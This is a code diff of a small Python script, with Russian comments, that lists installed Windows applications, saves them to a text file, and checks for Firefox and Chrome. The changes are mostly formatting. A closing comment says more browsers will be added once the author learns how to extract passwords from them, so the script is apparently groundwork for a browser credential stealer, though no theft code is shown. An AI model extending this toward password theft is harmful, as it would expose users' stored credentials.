@@ -14,22 +14,22 @@ def get_apps():
 
     for app in winapps.list_installed():
         app_list.append(app)  # все приложения записуются в апп лист
-        f.write((str(app) + '\n'))#запись результата в текстовик
+        f.write((str(app) + '\n'))  # запись результата в текстовик
 
     f.close()
 
 
 def scan_apps():
     fire = 'Firefox'
-    file = open('text.txt','r')
+    file = open('text.txt', 'r')
     text = file.read()
     if fire in text:
         firefox = True
-    print(firefox)
+        print(firefox)
 
     chro = 'Chrome'
     if chro in text:
         chrome = True
-    print(chrome)
+        print(chrome)
     file.close()
-#Нужно добавить еще браузеров, но это после того как узнаем как получить из них пароли
+# Нужно добавить еще браузеров, но это после того как узнаем как получить из них пароли
